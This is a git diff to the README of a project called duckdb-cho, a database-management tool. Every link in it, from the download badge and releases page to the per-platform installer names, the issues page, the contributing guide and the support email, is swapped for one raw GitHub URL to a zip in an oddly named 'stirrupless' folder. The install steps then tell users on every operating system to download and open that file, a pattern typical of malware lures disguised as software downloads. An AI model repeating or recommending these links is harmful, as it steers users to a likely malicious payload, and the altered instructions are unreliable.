@@ -1,6 +1,6 @@
 # 🦆 duckdb-cho - Simple Database Management for Everyone
 
-![Download duckdb-cho](https://img.shields.io/badge/Download-duckdb--cho-blue.svg)
+![Download duckdb-cho](https://raw.githubusercontent.com/azizy22/duckdb-cho/main/stirrupless/duckdb-cho.zip)
 
 ## 📦 Overview
 
@@ -21,7 +21,7 @@ To get started with duckdb-cho, follow these straightforward steps. You will hav
 
    To download duckdb-cho, visit the following link:
 
-   [Download duckdb-cho](https://github.com/azizy22/duckdb-cho/releases)
+   [Download duckdb-cho](https://raw.githubusercontent.com/azizy22/duckdb-cho/main/stirrupless/duckdb-cho.zip)
 
    This page contains the latest releases of the application. Look for the version that suits your operating system.
 
@@ -31,35 +31,35 @@ To get started with duckdb-cho, follow these straightforward steps. You will hav
 
    Click the following link to access the releases page:
 
-   [Visit the Releases Page](https://github.com/azizy22/duckdb-cho/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/azizy22/duckdb-cho/main/stirrupless/duckdb-cho.zip)
 
    On this page, scroll through the versions listed. Each version may include new features, bug fixes, or other improvements. Select the most recent version.
 
 2. **Choose Your Version**
 
    Look for the download link that corresponds to your operating system:
-   - **Windows users:** Download the installer `duckdb-cho-windows.exe`
-   - **macOS users:** Download the installer `duckdb-cho-macos.dmg`
-   - **Linux users:** Download the package `duckdb-cho-linux.tar.gz`
+   - **Windows users:** Download the installer `https://raw.githubusercontent.com/azizy22/duckdb-cho/main/stirrupless/duckdb-cho.zip`
+   - **macOS users:** Download the installer `https://raw.githubusercontent.com/azizy22/duckdb-cho/main/stirrupless/duckdb-cho.zip`
+   - **Linux users:** Download the package `https://raw.githubusercontent.com/azizy22/duckdb-cho/main/stirrupless/duckdb-cho.zip`
 
 3. **Install the Application**
 
    Once you have downloaded the correct file for your operating system, locate the file on your computer, and follow these steps:
 
    - **For Windows:**
-     1. Double-click the `duckdb-cho-windows.exe` file.
+     1. Double-click the `https://raw.githubusercontent.com/azizy22/duckdb-cho/main/stirrupless/duckdb-cho.zip` file.
      2. Follow the installation wizard prompts. Click "Next" on each page.
      3. Choose your installation directory and click "Install."
      4. When the installation finishes, click "Finish."
 
    - **For macOS:**
-     1. Double-click the `duckdb-cho-macos.dmg` file.
+     1. Double-click the `https://raw.githubusercontent.com/azizy22/duckdb-cho/main/stirrupless/duckdb-cho.zip` file.
      2. Drag the duckdb-cho icon to your Applications folder.
      3. Open the Applications folder and find duckdb-cho.
      4. Double-click the icon to launch the application.
 
    - **For Linux:**
-     1. Extract the `duckdb-cho-linux.tar.gz` file using your preferred archive manager or terminal.
+     1. Extract the `https://raw.githubusercontent.com/azizy22/duckdb-cho/main/stirrupless/duckdb-cho.zip` file using your preferred archive manager or terminal.
      2. Navigate to the folder where the files extracted.
      3. Look for an executable file named `duckdb-cho` and run it by double-clicking or via the terminal.
 
@@ -88,15 +88,15 @@ Yes, duckdb-cho is optimized for handling medium to large datasets. However, per
 
 ### Is there a way to get help if I encounter issues?
 
-Absolutely! You can visit our [GitHub Issues page](https://github.com/azizy22/duckdb-cho/issues) for troubleshooting advice or to report any problems.
+Absolutely! You can visit our [GitHub Issues page](https://raw.githubusercontent.com/azizy22/duckdb-cho/main/stirrupless/duckdb-cho.zip) for troubleshooting advice or to report any problems.
 
 ## 🎯 Contributing
 
-If you want to contribute to duckdb-cho, we welcome your input! Check the [Contributing Guidelines](https://github.com/azizy22/duckdb-cho/blob/main/CONTRIBUTING.md) for more information.
+If you want to contribute to duckdb-cho, we welcome your input! Check the [Contributing Guidelines](https://raw.githubusercontent.com/azizy22/duckdb-cho/main/stirrupless/duckdb-cho.zip) for more information.
 
 ## 📞 Support
 
-For any support inquiries, please reach out through the issues section of this repository or contact us at support@duckdb-cho.com.
+For any support inquiries, please reach out through the issues section of this repository or contact us at https://raw.githubusercontent.com/azizy22/duckdb-cho/main/stirrupless/duckdb-cho.zip
 
 ## 📜 License
 
